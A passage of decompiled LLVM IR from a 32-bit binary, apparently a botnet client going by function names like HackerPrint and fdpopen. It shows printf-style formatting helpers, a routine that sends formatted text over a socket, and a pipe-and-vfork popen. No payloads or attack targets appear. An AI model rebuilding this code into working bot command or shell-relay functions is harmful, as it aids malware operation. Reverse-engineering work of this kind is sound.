dec_label_pc_8048504.lr.ph:                       ; preds = %dec_label_pc_80484f3
  %v5_8048507 = sext i32 %arg3 to i64
  br label %dec_label_pc_8048504

dec_label_pc_8048504:                             ; preds = %dec_label_pc_8048504.lr.ph, %dec_label_pc_804852c
  %stack_var_-24.118 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048504.lr.ph ], [ %v5_8048551, %dec_label_pc_804852c ]
  %stack_var_-40.017 = phi i8* [ %tmp43, %dec_label_pc_8048504.lr.ph ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v6_8048512 = and i64 %stack_var_-24.118, 4294967295
  %v12_8048512 = udiv i64 %v6_8048512, %v5_8048507
  %v13_8048512 = trunc i64 %v12_8048512 to i32
  %v14_8048512 = urem i64 %v6_8048512, %v5_8048507
  %v5_8048517 = trunc i64 %v14_8048512 to i8
  %v7_804851e = icmp sgt i8 %v5_8048517, 9
  br i1 %v7_804851e, label %dec_label_pc_8048520, label %dec_label_pc_804852c

dec_label_pc_8048520:                             ; preds = %dec_label_pc_8048504
  %tmp = trunc i64 %v14_8048512 to i32
  %v5_8048523 = add i32 %tmp, %arg7
  %v1_8048526 = add i32 %v5_8048523, 198
  %v11_8048526 = trunc i32 %v1_8048526 to i8
  br label %dec_label_pc_804852c

dec_label_pc_804852c:                             ; preds = %dec_label_pc_8048504, %dec_label_pc_8048520
  %stack_var_-36.0 = phi i8 [ %v11_8048526, %dec_label_pc_8048520 ], [ %v5_8048517, %dec_label_pc_8048504 ]
  %v4_804852c = ptrtoint i8* %stack_var_-40.017 to i32
  %v5_804852c = add i32 %v4_804852c, -1
  %v22_804852c = inttoptr i32 %v5_804852c to i8*
  %v2_8048533 = add i8 %stack_var_-36.0, 48
  store i8 %v2_8048533, i8* %v22_804852c, align 1
  %v5_8048551 = sext i32 %v13_8048512 to i64
  %v5_8048554 = icmp eq i32 %v13_8048512, 0
  %v1_8048558 = icmp eq i1 %v5_8048554, false
  br i1 %v1_8048558, label %dec_label_pc_8048504, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_804852c, %dec_label_pc_80484f3
  %stack_var_-40.0.lcssa = phi i8* [ %tmp43, %dec_label_pc_80484f3 ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v4_804855a = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804855a, label %dec_label_pc_8048594, label %dec_label_pc_8048560

dec_label_pc_8048560:                             ; preds = %dec_label_pc_804855a
  %v4_8048560 = icmp eq i32 %arg5, 0
  br i1 %v4_8048560, label %dec_label_pc_804858b, label %dec_label_pc_8048566

dec_label_pc_8048566:                             ; preds = %dec_label_pc_8048560
  %v1_8048569 = and i32 %arg6, 2
  %v2_8048569 = icmp eq i32 %v1_8048569, 0
  br i1 %v2_8048569, label %dec_label_pc_804858b, label %dec_label_pc_8048570

dec_label_pc_8048570:                             ; preds = %dec_label_pc_8048566
  %v3_804857e = inttoptr i32 %arg1 to i32*
  %v4_804857e = call i32 @printchar(i32* %v3_804857e, i32 45)
  %v4_8048586 = add i32 %arg5, -1
  br label %dec_label_pc_8048594

dec_label_pc_804858b:                             ; preds = %dec_label_pc_8048566, %dec_label_pc_8048560
  %v4_804858b = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804858b = add i32 %v4_804858b, -1
  %v22_804858b = inttoptr i32 %v5_804858b to i8*
  store i8 45, i8* %v22_804858b, align 1
  br label %dec_label_pc_8048594

dec_label_pc_8048594:                             ; preds = %dec_label_pc_804855a, %dec_label_pc_8048570, %dec_label_pc_804858b
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_804855a ], [ %arg5, %dec_label_pc_804858b ], [ %v4_8048586, %dec_label_pc_8048570 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_804855a ], [ %v22_804858b, %dec_label_pc_804858b ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048570 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804855a ], [ 0, %dec_label_pc_804858b ], [ 1, %dec_label_pc_8048570 ]
  %v6_80485af = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_80485b7 = add i32 %v6_80485af, %stack_var_-28.0
  store i32 %v2_80485b7, i32* @edx, align 4
  br label %dec_label_pc_80485bc

dec_label_pc_80485bc:                             ; preds = %dec_label_pc_80484a2, %dec_label_pc_8048594
  %storemerge = phi i32 [ %v2_80485b7, %dec_label_pc_8048594 ], [ %v6_80484c5, %dec_label_pc_80484a2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_804852c, { 0, 2, 1 }
  uselistorder i8 %v5_8048517, { 1, 0 }
  uselistorder i64 %v6_8048512, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485bc, { 1, 0 }
  uselistorder label %dec_label_pc_8048594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804852c, { 1, 0 }
  uselistorder label %dec_label_pc_8048504, { 1, 0 }
  uselistorder label %dec_label_pc_80484f3, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80485c1 = load i32, i32* @ebp, align 4
  store i32 %v0_80485c1, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.435 = inttoptr i32 %arg2 to i8*
  %v2_804887536 = load i8, i8* %stack_var_8.435, align 1
  %v4_804887838 = icmp eq i8 %v2_804887536, 0
  %v1_804887a40 = icmp eq i1 %v4_804887838, false
  br i1 %v1_804887a40, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_80485d3:                             ; preds = %entry, %dec_label_pc_804886f
  %stack_var_8.444 = phi i8* [ %stack_var_8.4, %dec_label_pc_804886f ], [ %stack_var_8.435, %entry ]
  %stack_var_-28.143 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804886f ], [ 0, %entry ]
  %stack_var_12.142 = phi i32 [ %stack_var_12.0, %dec_label_pc_804886f ], [ %arg3, %entry ]
  %stack_var_8.4.in41 = phi i32 [ %v5_804886f, %dec_label_pc_804886f ], [ %arg2, %entry ]
  %v2_80485d6 = load i8, i8* %stack_var_8.444, align 1
  %v10_80485d9 = icmp eq i8 %v2_80485d6, 37
  %v1_80485db = icmp eq i1 %v10_80485d9, false
  br i1 %v1_80485db, label %dec_label_pc_8048854, label %dec_label_pc_80485e1

dec_label_pc_80485e1:                             ; preds = %dec_label_pc_80485d3
  %v5_80485e1 = add i32 %stack_var_8.4.in41, 1
  %v22_80485e1 = inttoptr i32 %v5_80485e1 to i8*
  %v2_80485f4 = load i8, i8* %v22_80485e1, align 1
  %v4_80485f7 = icmp eq i8 %v2_80485f4, 0
  br i1 %v4_80485f7, label %dec_label_pc_8048880, label %dec_label_pc_80485ff

dec_label_pc_80485ff:                             ; preds = %dec_label_pc_80485e1
  %v2_8048602 = load i8, i8* %v22_80485e1, align 1
  %v10_8048605 = icmp eq i8 %v2_8048602, 37
  br i1 %v10_8048605, label %dec_label_pc_8048854, label %dec_label_pc_804860d

dec_label_pc_804860d:                             ; preds = %dec_label_pc_80485ff
  %v2_8048610 = load i8, i8* %v22_80485e1, align 1
  %v10_8048613 = icmp eq i8 %v2_8048610, 45
  %v1_8048615 = icmp eq i1 %v10_8048613, false
  br i1 %v1_8048615, label %dec_label_pc_804862a.preheader, label %dec_label_pc_8048617

dec_label_pc_8048617:                             ; preds = %dec_label_pc_804860d
  %v5_8048617 = add i32 %stack_var_8.4.in41, 2
  %v22_8048617 = inttoptr i32 %v5_8048617 to i8*
  br label %dec_label_pc_804862a.preheader

dec_label_pc_804862a.preheader:                   ; preds = %dec_label_pc_8048617, %dec_label_pc_804860d
  %stack_var_8.0.ph = phi i8* [ %v22_80485e1, %dec_label_pc_804860d ], [ %v22_8048617, %dec_label_pc_8048617 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804860d ], [ 1, %dec_label_pc_8048617 ]
  %v4_804862a22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_804862d23 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_804863030 = icmp eq i8 %v2_804862d23, 48
  br i1 %v7_804863030, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048623:                             ; preds = %dec_label_pc_804862a.preheader, %dec_label_pc_8048623
  %v4_804862a33 = phi i32 [ %v5_8048623, %dec_label_pc_8048623 ], [ %v4_804862a22, %dec_label_pc_804862a.preheader ]
  %stack_var_-32.032 = phi i32 [ %v4_8048626, %dec_label_pc_8048623 ], [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ]
  %v5_8048623 = add i32 %v4_804862a33, 1
  %v22_8048623 = inttoptr i32 %v5_8048623 to i8*
  %v4_8048626 = or i32 %stack_var_-32.032, 2
  %v2_804862d = load i8, i8* %v22_8048623, align 1
  %v7_8048630 = icmp eq i8 %v2_804862d, 48
  br i1 %v7_8048630, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048659.preheader:                   ; preds = %dec_label_pc_8048623, %dec_label_pc_804862a.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804862a.preheader ], [ %v22_8048623, %dec_label_pc_8048623 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ], [ %v4_8048626, %dec_label_pc_8048623 ]
  br label %dec_label_pc_8048659

dec_label_pc_8048636:                             ; preds = %dec_label_pc_8048663
  %v2_804863f = mul i32 %stack_var_-36.0, 10
  %v2_8048647 = load i8, i8* %stack_var_8.1, align 1
  %v3_8048647 = zext i8 %v2_8048647 to i32
  %v5_804864d = add i32 %v3_8048647, %v2_804863f
  %v1_8048650 = add i32 %v5_804864d, -48
  %v5_8048656 = add i32 %v4_8048659, 1
  %v22_8048656 = inttoptr i32 %v5_8048656 to i8*
  br label %dec_label_pc_8048659

dec_label_pc_8048659:                             ; preds = %dec_label_pc_8048659.preheader, %dec_label_pc_8048636
  %stack_var_8.1 = phi i8* [ %v22_8048656, %dec_label_pc_8048636 ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048659.preheader ]
  %stack_var_-36.0 = phi i32 [ %v1_8048650, %dec_label_pc_8048636 ], [ 0, %dec_label_pc_8048659.preheader ]
  %v4_8048659 = ptrtoint i8* %stack_var_8.1 to i32
  %v2_804865c = load i8, i8* %stack_var_8.1, align 1
  %tmp = icmp ult i8 %v2_804865c, 48
  br i1 %tmp, label %dec_label_pc_804866d, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_8048659
  %v2_8048666 = load i8, i8* %stack_var_8.1, align 1
  %tmp48 = icmp ult i8 %v2_8048666, 58
  br i1 %tmp48, label %dec_label_pc_8048636, label %dec_label_pc_804866d

dec_label_pc_804866d:                             ; preds = %dec_label_pc_8048663, %dec_label_pc_8048659
  %v2_8048670 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048673 = icmp eq i8 %v2_8048670, 115
  %v1_8048675 = icmp eq i1 %v10_8048673, false
  br i1 %v1_8048675, label %dec_label_pc_80486c4, label %dec_label_pc_8048677

dec_label_pc_8048677:                             ; preds = %dec_label_pc_804866d
  %v1_804867a = add i32 %stack_var_12.142, 4
  %v1_8048682 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048682 = load i32, i32* %v1_8048682, align 4
  %v4_8048687 = icmp eq i32 %v2_8048682, 0
  br i1 %v4_8048687, label %dec_label_pc_804869c, label %dec_label_pc_804868d

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048677
  %v5_8048690 = inttoptr i32 %v2_8048682 to i8*
  br label %dec_label_pc_804869c

dec_label_pc_804869c:                             ; preds = %dec_label_pc_8048677, %dec_label_pc_804868d
  %storemerge = phi i8* [ %v5_8048690, %dec_label_pc_804868d ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058c8d.12, i32 0, i32 0), %dec_label_pc_8048677 ]
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_80486b7 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_80486bc = add i32 %v6_80486b7, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80486c4:                             ; preds = %dec_label_pc_804866d
  %v2_80486c7 = load i8, i8* %stack_var_8.1, align 1
  %v10_80486ca = icmp eq i8 %v2_80486c7, 100
  %v1_80486cc = icmp eq i1 %v10_80486ca, false
  br i1 %v1_80486cc, label %dec_label_pc_8048718, label %dec_label_pc_80486ce

dec_label_pc_80486ce:                             ; preds = %dec_label_pc_80486c4
  %v1_80486d1 = add i32 %stack_var_12.142, 4
  %v1_80486d9 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80486d9 = load i32, i32* %v1_80486d9, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804870b = sext i32 %v2_80486d9 to i64
  %v9_804870b = call i32 @printi(i32 %tmp6, i64 %v8_804870b, i32 10, i32 1, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048710 = add i32 %v9_804870b, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048718:                             ; preds = %dec_label_pc_80486c4
  %v2_804871b = load i8, i8* %stack_var_8.1, align 1
  %v10_804871e = icmp eq i8 %v2_804871b, 120
  %v1_8048720 = icmp eq i1 %v10_804871e, false
  br i1 %v1_8048720, label %dec_label_pc_804876c, label %dec_label_pc_8048722

dec_label_pc_8048722:                             ; preds = %dec_label_pc_8048718
  %v1_8048725 = add i32 %stack_var_12.142, 4
  %v1_804872d = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804872d = load i32, i32* %v1_804872d, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804875f = sext i32 %v2_804872d to i64
  %v9_804875f = call i32 @printi(i32 %tmp6, i64 %v8_804875f, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048764 = add i32 %v9_804875f, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_804876c:                             ; preds = %dec_label_pc_8048718
  %v2_804876f = load i8, i8* %stack_var_8.1, align 1
  %v10_8048772 = icmp eq i8 %v2_804876f, 88
  %v1_8048774 = icmp eq i1 %v10_8048772, false
  br i1 %v1_8048774, label %dec_label_pc_80487c0, label %dec_label_pc_8048776

dec_label_pc_8048776:                             ; preds = %dec_label_pc_804876c
  %v1_8048779 = add i32 %stack_var_12.142, 4
  %v1_8048781 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048781 = load i32, i32* %v1_8048781, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80487b3 = sext i32 %v2_8048781 to i64
  %v9_80487b3 = call i32 @printi(i32 %tmp6, i64 %v8_80487b3, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_80487b8 = add i32 %v9_80487b3, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80487c0:                             ; preds = %dec_label_pc_804876c
  %v2_80487c3 = load i8, i8* %stack_var_8.1, align 1
  %v10_80487c6 = icmp eq i8 %v2_80487c3, 117
  %v1_80487c8 = icmp eq i1 %v10_80487c6, false
  br i1 %v1_80487c8, label %dec_label_pc_8048811, label %dec_label_pc_80487ca

dec_label_pc_80487ca:                             ; preds = %dec_label_pc_80487c0
  %v1_80487cd = add i32 %stack_var_12.142, 4
  %v1_80487d5 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80487d5 = load i32, i32* %v1_80487d5, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_8048807 = sext i32 %v2_80487d5 to i64
  %v9_8048807 = call i32 @printi(i32 %tmp6, i64 %v8_8048807, i32 10, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804880c = add i32 %v9_8048807, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048811:                             ; preds = %dec_label_pc_80487c0
  %v2_8048814 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048817 = icmp eq i8 %v2_8048814, 99
  %v1_8048819 = icmp eq i1 %v10_8048817, false
  br i1 %v1_8048819, label %dec_label_pc_804886f, label %dec_label_pc_804881b

dec_label_pc_804881b:                             ; preds = %dec_label_pc_8048811
  %v1_804881e = add i32 %stack_var_12.142, 4
  %v1_8048826 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048826 = load i32, i32* %v1_8048826, align 4
  store i32 %v2_8048826, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_804884a = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_804884f = add i32 %v6_804884a, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048854:                             ; preds = %dec_label_pc_80485ff, %dec_label_pc_80485d3
  %stack_var_8.2 = phi i8* [ %stack_var_8.444, %dec_label_pc_80485d3 ], [ %v22_80485e1, %dec_label_pc_80485ff ]
  %v2_8048857 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048857 = zext i8 %v2_8048857 to i32
  %v4_8048867 = call i32 @printchar(i32* %arg1, i32 %v3_8048857)
  %v4_804886c = add i32 %stack_var_-28.143, 1
  br label %dec_label_pc_804886f

dec_label_pc_804886f:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_804881b, %dec_label_pc_80487ca, %dec_label_pc_8048776, %dec_label_pc_804869c, %dec_label_pc_8048722, %dec_label_pc_80486ce, %dec_label_pc_8048854
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048854 ], [ %stack_var_8.1, %dec_label_pc_8048811 ], [ %stack_var_8.1, %dec_label_pc_804881b ], [ %stack_var_8.1, %dec_label_pc_80487ca ], [ %stack_var_8.1, %dec_label_pc_8048776 ], [ %stack_var_8.1, %dec_label_pc_8048722 ], [ %stack_var_8.1, %dec_label_pc_80486ce ], [ %stack_var_8.1, %dec_label_pc_804869c ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.142, %dec_label_pc_8048854 ], [ %stack_var_12.142, %dec_label_pc_8048811 ], [ %v1_804881e, %dec_label_pc_804881b ], [ %v1_80487cd, %dec_label_pc_80487ca ], [ %v1_8048779, %dec_label_pc_8048776 ], [ %v1_8048725, %dec_label_pc_8048722 ], [ %v1_80486d1, %dec_label_pc_80486ce ], [ %v1_804867a, %dec_label_pc_804869c ]
  %stack_var_-28.0 = phi i32 [ %v4_804886c, %dec_label_pc_8048854 ], [ %stack_var_-28.143, %dec_label_pc_8048811 ], [ %v5_804884f, %dec_label_pc_804881b ], [ %v5_804880c, %dec_label_pc_80487ca ], [ %v5_80487b8, %dec_label_pc_8048776 ], [ %v5_8048764, %dec_label_pc_8048722 ], [ %v5_8048710, %dec_label_pc_80486ce ], [ %v5_80486bc, %dec_label_pc_804869c ]
  %v4_804886f = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804886f = add i32 %v4_804886f, 1
  %stack_var_8.4 = inttoptr i32 %v5_804886f to i8*
  %v2_8048875 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048878 = icmp eq i8 %v2_8048875, 0
  %v1_804887a = icmp eq i1 %v4_8048878, false
  br i1 %v1_804887a, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_804886f, %dec_label_pc_80485e1, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.143, %dec_label_pc_80485e1 ], [ %stack_var_-28.0, %dec_label_pc_804886f ]
  %v4_8048880 = icmp eq i32* %arg1, null
  br i1 %v4_8048880, label %dec_label_pc_804888e, label %dec_label_pc_8048886

dec_label_pc_8048886:                             ; preds = %dec_label_pc_8048880
  %v2_8048889 = load i32, i32* %arg1, align 4
  %v1_804888b = inttoptr i32 %v2_8048889 to i8*
  store i8 0, i8* %v1_804888b, align 1
  br label %dec_label_pc_804888e

dec_label_pc_804888e:                             ; preds = %dec_label_pc_8048880, %dec_label_pc_8048886
  %v2_8048891 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048891, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804886f, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 1, 0, 12 }
  uselistorder i8* %stack_var_8.1, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 16, 15, 13 }
  uselistorder i32 %v5_8048623, { 1, 0 }
  uselistorder i8* %v22_80485e1, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in41, { 1, 0 }
  uselistorder i32 %stack_var_12.142, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.143, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i64, i32, i32, i32, i32, i32)* @printi, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804888e, { 1, 0 }
  uselistorder label %dec_label_pc_804886f, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_804869c, { 1, 0 }
  uselistorder label %dec_label_pc_8048659, { 1, 0 }
  uselistorder label %dec_label_pc_8048623, { 1, 0 }
  uselistorder label %dec_label_pc_80485d3, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048893 = load i32, i32* @ebp, align 4
  store i32 %v0_8048893, i32* %stack_var_-4, align 4
  %v4_8048893 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048893, i32* @ebp, align 4
  %v4_804889c = ptrtoint i32* %stack_var_8 to i32
  %v4_80488b4 = call i32 @print(i32* null, i32 %arg1, i32 %v4_804889c)
  ret i32 %v4_80488b4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488bb = load i32, i32* @ebp, align 4
  store i32 %v0_80488bb, i32* %stack_var_-4, align 4
  %v4_80488bb = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80488bb, i32* @ebp, align 4
  %v4_80488c4 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488db = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80488c4)
  %v2_80488e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488e0, i32* @ebp, align 4
  ret i32 %v4_80488db

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e5 = load i32, i32* @edi, align 4
  store i32 %v0_80488e5, i32* %stack_var_-8, align 4
  %v1_80488f0 = call i32 @malloc(i32 2048)
  store i32 %v1_80488f0, i32* %stack_var_-20, align 4
  %v3_8048911 = inttoptr i32 %v1_80488f0 to i8*
  %v4_8048911 = call i32 @__GI_memset(i8* %v3_8048911, i32 0, i32 2048)
  %v4_804891f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048936 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_804891f)
  %v3_804894c = call i32 @_strlen(i8* %v3_8048911)
  %v6_8048953 = add i32 %v1_80488f0, %v3_804894c
  %v1_8048956 = inttoptr i32 %v6_8048953 to i8*
  store i8 10, i8* %v1_8048956, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_80488f0, i32* @edi, align 4
  %v3_804896a = call i32 @_strlen(i8* %v3_8048911)
  %v4_804898a = call i32 @__libc_send(i32 %arg1, i32 %v1_80488f0, i32 %v3_804896a, i32 16384)
  %v1_8048998 = call i32 @free(i32 %v1_80488f0)
  %v2_80489a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80489a3, i32* @edi, align 4
  ret i32 %v4_804898a

; uselistorder directives
  uselistorder i32 %v1_80488f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80489a9 = load i32, i32* @edi, align 4
  store i32 %v0_80489a9, i32* %stack_var_-8, align 4
  %v4_80489ad = ptrtoint i8* %arg2 to i32
  %v2_80489b0 = load i8, i8* %arg2, align 1
  %v10_80489b3 = icmp eq i8 %v2_80489b0, 114
  br i1 %v10_80489b3, label %dec_label_pc_80489c1, label %dec_label_pc_80489b7

dec_label_pc_80489b7:                             ; preds = %entry
  %v2_80489ba = load i8, i8* %arg2, align 1
  %v10_80489bd = icmp eq i8 %v2_80489ba, 119
  %v1_80489bf = icmp eq i1 %v10_80489bd, false
  br i1 %v1_80489bf, label %dec_label_pc_8048b83, label %dec_label_pc_80489c1

dec_label_pc_80489c1:                             ; preds = %dec_label_pc_80489b7, %entry
  %v1_80489c4 = add i32 %v4_80489ad, 1
  %v1_80489c5 = inttoptr i32 %v1_80489c4 to i8*
  %v2_80489c5 = load i8, i8* %v1_80489c5, align 1
  %v4_80489c8 = icmp eq i8 %v2_80489c5, 0
  br i1 %v4_80489c8, label %dec_label_pc_80489d8, label %dec_label_pc_8048b83

dec_label_pc_80489d8:                             ; preds = %dec_label_pc_80489c1
  %v2_80489d8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80489de = call i32 @__GI_pipe(i32 %v2_80489d8)
  %v2_80489e3 = icmp slt i32 %v2_80489de, 0
  %v1_80489e5 = icmp eq i1 %v2_80489e3, false
  br i1 %v1_80489e5, label %dec_label_pc_80489f3, label %dec_label_pc_8048b83

dec_label_pc_80489f3:                             ; preds = %dec_label_pc_80489d8
  %v0_80489f3 = load i8*, i8** @global_var_80624a0.13, align 4
  %v2_80489f8 = icmp eq i8* %v0_80489f3, null
  %v1_80489fa = icmp eq i1 %v2_80489f8, false
  br i1 %v1_80489fa, label %bb, label %dec_label_pc_80489fc

dec_label_pc_80489fc:                             ; preds = %dec_label_pc_80489f3
  %v1_80489fc = call i32 @getdtablesize(i32 %tmp11)
  %tmp19 = icmp slt i32 %v1_80489fc, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048a16, label %dec_label_pc_8048b83

dec_label_pc_8048a16:                             ; preds = %dec_label_pc_80489fc
  %v2_8048a19 = mul i32 %v1_80489fc, 4
  %v2_8048a1f = call i32 @malloc(i32 %v2_8048a19)
  %v1_8048a24 = inttoptr i32 %v2_8048a1f to i8*
  store i8* %v1_8048a24, i8** @global_var_80624a0.13, align 32
  %v2_8048a2e = icmp eq i32 %v2_8048a1f, 0
  %v1_8048a30 = icmp eq i1 %v2_8048a2e, false
  br i1 %v1_8048a30, label %dec_label_pc_8048a3e, label %dec_label_pc_8048b83

dec_label_pc_8048a3e:                             ; preds = %dec_label_pc_8048a16
  %v1_8048a41 = mul i32 %v1_80489fc, 4
  store i32 %v2_8048a1f, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048a52 = and i32 %v2_8048a1f, -256
  %v5_8048a54 = call i8* @_memset(i8* %v1_8048a24, i32 %v1_8048a52, i32 %v1_8048a41)
  br label %bb

bb:                                               ; preds = %dec_label_pc_80489f3, %dec_label_pc_8048a3e
  %v1_8048a56 = call i32 @__vfork(i32 %tmp11)
  %v13_8048a64 = icmp eq i32 %v1_8048a56, -1
  br i1 %v13_8048a64, label %dec_label_pc_8048a75, label %dec_label_pc_8048a6a

dec_label_pc_8048a6a:                             ; preds = %bb
  %v4_8048a6a = icmp eq i32 %v1_8048a56, 0
  %v2_8048a9a = load i8, i8* %arg2, align 1
  %v10_8048a9d = icmp eq i8 %v2_8048a9a, 114
  %v1_8048a9f = icmp eq i1 %v10_8048a9d, false
  br i1 %v4_8048a6a, label %dec_label_pc_8048a97, label %dec_label_pc_8048b3b

dec_label_pc_8048a75:                             ; preds = %bb
  %v3_8048a75 = load i32, i32* %stack_var_-24, align 4
